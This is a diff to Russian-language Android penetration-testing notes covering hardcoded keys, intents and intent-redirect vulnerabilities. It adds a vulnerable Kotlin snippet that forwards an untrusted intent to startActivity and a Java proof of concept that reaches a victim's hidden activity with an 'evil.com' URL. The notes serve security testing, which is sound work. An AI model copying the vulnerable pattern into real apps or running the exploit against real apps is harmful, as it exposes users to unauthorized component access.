@@ -89,7 +89,7 @@ https://cloud.hacktricks.xyz/pentesting-cloud/gcp-pentesting/gcp-services/gcp-da
 
 ### Hardocded credentials
 
-Иногда API-ключи могут храниться разработчиками в виде массива байт, i.e. `bytes = [104, 106, ..., 107]`, что не позволяет 
+Иногда API-ключи могут храниться разработчиками в виде массива байт, i.e. `bytes = [104, 106, ..., 107]`, что не позволяет найти их обычным грепом. 
 
 ### Native libraries
 
@@ -168,29 +168,48 @@ https://github.com/commonsguy/cwac-security/blob/master/PERMS.md
 
 ### Intents
 
-Интенты - это объекты для передачи сообщений между процессамии. Интенты могут быть явными (explicit, с указанием активити-получателя) и неявными (implicit, получателя выбирает ОС).
+Интенты - это объекты для передачи сообщений между процессами. Интенты могут быть явными (explicit, с указанием активити-получателя) и неявными (implicit, получателя выбирает ОС).
 
-Интенты [могут cоздаваться сайтами посредством ссылок](https://developer.chrome.com/docs/multidevice/android/intents/#syntax) и вызывать активити, если у активити задан атрибут `android.intent.category.BROWSABLE` 
+Обычно интенты создаются для того, чтобы из одного активити запустить другое активити, при этом опционально возможно передать вместе с вызовом какие-то параметры. Для того, чтобы определить, какие параметры будут использованы, у вызываемой активити создается фабричный метод:
+
+```java
+public static Intent newIntent(Context context, String token) {
+	Intent Intent = new Intent(context, ClassName.class);
+	intent.putExtra("token", token);
+	return intent;
+}
+```
+
+Интенты [могут вызываться сайтами посредством ссылок](https://developer.chrome.com/docs/multidevice/android/intents/#syntax) и создавать активити, если у активити задан атрибут `android.intent.category.BROWSABLE` 
 
 Интенты могут создавать угрозу интент-инъекций и интент-редиректа.
 
-Уязвимости intent redirect возникают тогда, когда exported activity передает интент в другое активити, которое злоумышленник не смог бы запустить иным образом:
+Уязвимости intent redirect возникают тогда, когда exported activity передает интент в другое активити, которое злоумышленник не смог бы запустить иным образом (не является экспортируемым.) Пример уязвимого кода и его эксплуатации приведен ниже:
+```kotlin
+android.content.Intent deeperIntent = (android.content.Intent) getIntent().getParcelableExtra("url");
+if (deeperIntent != null) {
+    startActivity(deeperIntent);
+    finish();
+    return;
+```
 
 ```java
-Intent extra = new Intent();
-extra.setClassName("com.victim", "com.victim.HiddenActivity");
-extra.putExtra("url", "http://evil.com/");
+Intent deeperIntent = new Intent();
+deeperIntent.setClassName("com.victim", "com.victim.HiddenActivity");
+deeperIntent.putExtra("url", "http://evil.com/");
 
-Intent intent = new Intent();
-intent.setClassName("com.victim", "com.victim.ExportedActivity");
-intent.putExtra("extra_intent", extra);
-startActivity(intent);
+Intent outerIntent = new Intent();
+outerIntent.setClassName("com.victim", "com.victim.ExportedActivity");
+outerIntent.putExtra("extra_intent", deeperIntent);
+startActivity(outerIntent);
 ```
 
 Следует уделять внимание exported activity, в котором интенты передаются далее в методы `startActivity()` и `sendBroadcast()` или создаются из строки методом `Intent.parseUri()`.
 
 ![](pics/intent-redirect.png)
 
+- https://blog.oversecured.com/Interception-of-Android-implicit-intents/#typical-vulnerabilities-in-standard-android-actions
+- https://blog.oversecured.com/Android-arbitrary-code-execution-via-third-party-package-contexts/
 ### Deeplink 
 
 Если среди exported activities есть что-то вроде `com.pkg-name.Deeplink`, это значит, что можно открывать ссылки при помощи drozer:
